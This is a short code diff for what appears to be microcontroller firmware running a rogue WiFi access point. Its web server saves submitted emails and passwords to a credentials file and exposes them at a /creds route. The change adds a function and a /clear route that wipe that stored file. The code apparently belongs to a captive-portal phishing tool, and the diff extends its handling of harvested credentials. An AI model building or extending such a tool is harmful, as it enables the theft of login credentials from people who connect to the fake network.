@@ -69,6 +69,18 @@ String clear() {
   return "<></>";
 }
 
+String clearCredentials() {
+  // Open the file in write mode to clear its contents
+  File file = SPIFFS.open("/credentials.txt", "w");
+  if (file) {
+    file.print(""); // Write an empty string
+    file.close();
+    return "File contents cleared.";
+  } else {
+    return "Failed to open the file.";
+  }
+}
+
 void saveCredentials(String email, String password) {
   File file = SPIFFS.open("/credentials.txt", "a");
   if (!file) {
@@ -154,6 +166,15 @@ void handlePost() {
   }
 }
 
+void handleClear() {
+  String response = clearCredentials();
+  File file = SPIFFS.open("/clear.html", "r");
+  String pageContent = file.readString();
+  pageContent.replace("{MESSAGE}", response);
+  webServer.send(200, "text/html", pageContent);
+  file.close();
+}
+
 void setup() {
   bootTime = lastActivity = millis();
   WiFi.mode(WIFI_AP);
@@ -169,9 +190,7 @@ void setup() {
 
   webServer.on("/post", HTTP_POST, handlePost);
   webServer.on("/creds", HTTP_GET, displayCredentials);
-  webServer.on("/clear", []() {
-    webServer.send(200, "text/html", clear());
-  });
+  webServer.on("/clear", HTTP_GET, handleClear);
 
   // Serve specific static files
   webServer.on("/script.js", []() {
